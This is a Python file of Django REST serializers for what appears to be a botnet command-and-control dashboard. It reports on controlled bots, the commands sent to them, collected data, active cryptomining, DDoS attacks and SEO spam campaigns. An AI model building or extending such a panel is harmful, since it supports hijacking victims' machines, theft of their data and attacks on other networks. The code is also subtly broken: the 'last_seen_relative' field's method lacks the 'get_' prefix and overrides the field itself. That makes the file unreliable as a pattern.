from rest_framework import serializers

from .models import Bot, Command

from django.utils import timezone

import humanize

class BotStatusSerializer(serializers.ModelSerializer):
    online_status = serializers.SerializerMethodField()
    last_seen_relative = serializers.SerializerMethodField()
    system_summary = serializers.SerializerMethodField()

    class Meta:
        model = Bot
        fields = [
            'bot_id', 'hostname', 'platform', 'status', 'online_status', 
            'last_seen', 'last_seen_relative', 'system_summary'
        ]

    def get_online_status(self, obj):
        return obj.is_online()
    
    def last_seen_relative(self, obj):
        return humanize.naturaltime(obj.last_seen)

    def get_system_summary(self, obj):
        return f"{obj.cpu_cores} cores, {humanize.naturalsize(obj.memory_size)} RAM"

class CommandStatusSerializer(serializers.ModelSerializer):
    bot_info = serializers.SerializerMethodField()
    execution_time_formatted = serializers.SerializerMethodField()

    class Meta:
        model = Command
        fields = [
            'id', 'command_name', 'command_type', 'status', 'bot_info',
            'created_at', 'executed_at', 'execution_time_formatted', 
        ]

    def get_bot_info(self, obj):
        return {
            'bot_id': obj.bot.bot_id,
            'hostname': obj.bot.hostname
        }
    
    def get_execution_time_formatted(self, obj):
        if obj.executed_at and obj.completed_at:
            duration = (obj.completed_at - obj.executed_at).total_seconds()
            return f"{duration:.2f}s"
        return "N/A"

class SystemStatsSerializer(serializers.Serializer):
    total_bots = serializers.IntegerField()
    online_bots = serializers.IntegerField()
    active_commands = serializers.IntegerField()
    total_data_collected = serializers.IntegerField()
    active_mining_operations = serializers.IntegerField()
    active_ddos_attacks = serializers.IntegerField()
    active_seo_campaigns = serializers.IntegerField()

    def to_representation(self, instance):
        data = super().to_representation(instance)
        #Adding humanized versions
        data['total_data_collected'] = humanize.naturalsize(data['total_data_collected'])
        return data